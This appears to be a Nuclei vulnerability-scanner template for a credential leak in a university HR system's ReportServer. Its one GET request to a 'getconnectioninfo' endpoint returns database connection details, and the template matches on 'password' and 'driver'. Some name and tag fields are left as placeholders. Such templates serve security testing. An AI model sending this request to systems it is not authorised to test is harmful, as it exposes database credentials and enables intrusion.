id: gxrlzy-ReportServer-info
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 高校人力资源管理系统ReportServer存在敏感信息泄露漏洞。
  reference:
    - https://github.com/wy876/POC/blob/main/EDU/%E9%AB%98%E6%A0%A1%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'password'
      - type: word
        part: body
        words:
          - 'driver'
